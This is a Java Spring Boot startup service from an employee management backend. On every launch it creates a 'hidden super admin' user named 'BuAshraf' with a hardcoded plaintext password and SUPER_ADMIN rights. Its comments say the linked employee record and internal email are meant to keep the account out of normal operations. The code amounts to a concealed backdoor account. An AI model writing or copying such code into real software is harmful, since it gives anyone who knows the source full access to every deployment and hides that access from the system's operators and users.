package com.ems.ems_backend.service;

import com.ems.ems_backend.model.Employee;
import com.ems.ems_backend.model.User;
import com.ems.ems_backend.repository.EmployeeRepository;
import com.ems.ems_backend.repository.UserRepository;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.ApplicationArguments;
import org.springframework.boot.ApplicationRunner;
import org.springframework.core.annotation.Order;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;
import org.springframework.transaction.annotation.Transactional;

import java.time.LocalDate;
import java.time.LocalDateTime;

@Service
@RequiredArgsConstructor
@Slf4j
@Order(1) // Execute before other initializers
public class OwnerInitializationService implements ApplicationRunner {

    private final UserRepository userRepository;
    private final EmployeeRepository employeeRepository;
    private final PasswordEncoder passwordEncoder;

    @Override
    @Transactional
    public void run(ApplicationArguments args) {
        createOwnerAccount();
    }

    private void createOwnerAccount() {
        try {
            // Check if owner account already exists
            if (userRepository.findByUsername("BuAshraf").isPresent()) {
                log.info("Owner account already exists, skipping creation.");
                return;
            }

            // Create the hidden super admin employee first
            Employee ownerEmployee = new Employee();
            ownerEmployee.setFirstName("Bu");
            ownerEmployee.setLastName("Ashraf");
            ownerEmployee.setEmployeeId("EMS000"); // Special ID for owner
            ownerEmployee.setDepartment("Executive Management");
            ownerEmployee.setPosition("System Owner");
            ownerEmployee.setPhone("000-000-0000");
            ownerEmployee.setAddress("EMS Headquarters");
            ownerEmployee.setHireDate(LocalDate.now());
            ownerEmployee.setBirthDate(LocalDate.of(1980, 1, 1));
            ownerEmployee.setStatus(Employee.Status.ACTIVE);
            ownerEmployee.setSalary(0.0); // Hidden salary

            Employee savedEmployee = employeeRepository.save(ownerEmployee);

            // Create the hidden super admin user
            User ownerUser = new User();
            ownerUser.setUsername("BuAshraf");
            ownerUser.setEmail("owner@ems.internal"); // Internal email to hide from normal operations
            ownerUser.setPassword(passwordEncoder.encode("Mukulaib@Ems"));
            ownerUser.setRole(User.Role.SUPER_ADMIN); // Use SUPER_ADMIN instead of ADMIN
            ownerUser.setAccountNonExpired(true);
            ownerUser.setAccountNonLocked(true);
            ownerUser.setCredentialsNonExpired(true);
            ownerUser.setEnabled(true);
            ownerUser.setCreatedAt(LocalDateTime.now());
            ownerUser.setUpdatedAt(LocalDateTime.now());
            ownerUser.setEmployee(savedEmployee);

            userRepository.save(ownerUser);

            // Update the employee with user reference
            savedEmployee.setUser(ownerUser);
            employeeRepository.save(savedEmployee);

            log.info("✅ Owner account 'BuAshraf' created successfully with super admin privileges.");

        } catch (Exception e) {
            log.error("❌ Failed to create owner account: {}", e.getMessage(), e);
        }
    }
}
